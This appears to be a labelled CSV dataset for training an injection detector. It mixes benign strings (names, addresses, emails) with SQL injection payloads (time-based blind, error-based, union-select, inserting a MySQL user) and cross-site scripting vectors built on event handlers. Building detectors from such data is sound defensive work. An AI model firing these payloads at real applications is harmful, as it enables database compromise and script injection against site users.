payload,type
"calle del mistral, 65",benign
47939000p,benign
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",xss
<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>,xss
"<a ondblclick=""alert(1)"">test</a>",xss
"c/ dau 100, 10-a",benign
"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",xss
"-8002'   )    )     )   union all select 6647,6647,6647--",sqli
"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
lopiano,benign
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",sqli
75u1al3e,benign
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",xss
eliseo,benign
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
"""^""",sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",xss
trbena,benign
 union select,sqli
"""*""",sqli
prdica,benign
sylvie@laspruebascongaseosa.pk,benign
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sqli
v433g3o5i6r79,benign
"<data onkeydown=""alert(1)"" contenteditable>test</data>",xss
medwin-whittinghill@enla.th,benign
cecon5,benign
25270,benign
"<tt onmousemove=""alert(1)"">test</tt>",xss
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",sqli
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,xss
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",xss
yu-chian,benign
6110,benign
"<form onbeforepaste=""alert(1)"" contenteditable>test</form>",xss
"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",sqli
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",sqli
"<import namespace=""t"" implementation=""#default#time2"">",xss
<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>,xss
"<style>:target {transform: rotate(180deg);}</style><head id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></head>",xss
"<var onmouseenter=""alert(1)"">test</var>",xss
"<hgroup draggable=""true"" ondragstart=""alert(1)"">test</hgroup>",xss
"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>",xss
"1%'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",sqli
"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dir>",xss
5.49E+15,benign
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nhmz' like 'nhmz",sqli
"-5863"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""gkvy""  =  ""gkvy",sqli
"<video draggable=""true"" ondrag=""alert(1)"">test</video>",xss
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",xss
"<style>@keyframes slidein {}</style><applet style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></applet>",xss
anatoly,benign
"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",xss
"1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
"<input onpaste=alert(1) value="""" autofocus>",xss
credido poma,benign
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sqli
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",sqli
nanclares espejo,benign
"<div draggable=""true"" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>",xss
3.38E+15,benign
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",sqli
"<frame onmouseenter=""alert(1)"">test</frame>",xss
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",sqli
"<acronym onmouseleave=""alert(1)"">test</acronym>",xss
"<header onkeyup=""alert(1)"" contenteditable>test</header>",xss
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,sqli
vlez acejas,benign
top['al\x65rt'](1),xss
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",sqli
"<style>:target {transform: rotate(180deg);}</style><col id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></col>",xss
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",xss
1'+  (  select kfmv where 1679  =  1679,sqli
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,sqli
"<plaintext onbeforecopy=""alert(1)"" contenteditable>test</plaintext>",xss
29691,benign
rosalia,benign
victoria,benign
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",xss
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
4or3554e0a,benign
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",xss
"-2028'   )    )     )   union all select 8698,8698,8698,8698#",sqli
"c/ santisimo cristo del amor, 186,",benign
"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",sqli
8217,benign
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",sqli
"<sub onmouseenter=""alert(1)"">test</sub>",xss
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></b>",xss
<svg><noembed onload=alert(1)></noembed>,xss
"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>",xss
 ORDER BY 22# ,sqli
"<script onbeforecut=""alert(1)"" contenteditable>test</script>",xss
tyler,benign
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",sqli
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"<details onbeforecut=""alert(1)"" contenteditable>test</details>",xss
<svg><option onload=alert(1)></option>,xss
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wynp",sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ",sqli
lula,benign
7250,benign
27113,benign
"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",sqli
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionend=alert(1)></ins>",xss
1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sqli
"<track onkeyup=""alert(1)"" contenteditable>test</track>",xss
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",sqli
<html ontouchstart=alert(1)> ,xss
"<col onmousedown=""alert(1)"">test</col>",xss
"<code onmouseenter=""alert(1)"">test</code>",xss
05072293b,benign
sixto,benign
"1"" where 3510  =  3510",sqli
1'   )    )    as eymg where 7000  =  7000,sqli
<svg onload=alert(1)>,xss
"<rp onbeforepaste=""alert(1)"" contenteditable>test</rp>",xss
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationstart=""alert(1)""></tbody>",xss
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",xss
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",sqli
"<th draggable=""true"" ondrag=""alert(1)"">test</th>",xss
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,xss
"<hgroup onmouseover=""alert(1)"">test</hgroup>",xss
"<style>:target {transform: rotate(180deg);}</style><dir id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dir>",xss
"<applet oncontextmenu=""alert(1)"">test</applet>",xss
leiro,benign
"1""   )    )     )   union all select null,null,null,null,null,null,null,null--",sqli
1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sqli
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,sqli
"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionend=alert(1)></blockquote>",xss
seno,benign
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",sqli
<style onreadystatechange=alert(1)></style>,xss
"<i draggable=""true"" ondragend=""alert(1)"">test</i>",xss
femke,benign
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- ,sqli
7633,benign
"<summary onmouseenter=""alert(1)"">test</summary>",xss
donet acst,benign
1   )    )    as mlpf where 7425  =  7425,sqli
"<time onmousedown=""alert(1)"">test</time>",xss
 or sleep(__TIME__)#,sqli
1   )    )     )   and 6358  =  6735,sqli
limburg@estoespresto.cd,benign
blanquer,benign
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
llambilles,benign
eddier,benign
tremewan,benign
"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
<svg id=x tabindex=1 onactivate=alert(1)></svg>,xss
"<track onbeforecut=""alert(1)"" contenteditable>test</track>",xss
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",sqli
"av. italia, 66, 4-a",benign
59072549q,benign
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,sqli
 or ''^',sqli
"c/ hortensia 48,",benign
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'wzdo'  =  'wzdo",sqli
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",sqli
"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
<svg><element onload=alert(1)></element>,xss
"1""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006",sqli
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",xss
"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",xss
revelante,benign
*/*,sqli
tiza,benign
"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",sqli
"<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>",xss
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",sqli
"<form draggable=""true"" ondragstart=""alert(1)"">test</form>",xss
"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,sqli
8759,benign
"-4166%""  )   union all select 5190--",sqli
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,xss
molet,benign
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",xss
<input onchange=alert(1) value=xss>,xss
agramontesa,benign
 ORDER BY 29 ,sqli
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",xss
"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>",xss
17850,benign
"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",sqli
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,xss
"<sup onclick=""alert(1)"">test</sup>",xss
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",sqli
<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>,xss
"<frameset draggable=""true"" ondragleave=""alert(1)"">test</frameset>",xss
"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",sqli
reiko,benign
"c/ don bosco 65, 10-d",benign
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationend=""alert(1)""></kbd>",xss
"<br onmousedown=""alert(1)"">test</br>",xss
"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",sqli
" UNION ALL SELECT 1,2,3,4,5,6,7,8-- ",sqli
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",xss
"<ruby ondblclick=""alert(1)"">test</ruby>",xss
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,xss
<source id=x tabindex=1 onfocus=alert(1)></source>,xss
"<html draggable=""true"" ondragstart=""alert(1)"">test</html>",xss
"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",sqli
arme!lluela,benign
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",sqli
40979614p,benign
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",sqli
<input type=checkbox id=x onfocusin=alert(1)>,xss
"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",sqli
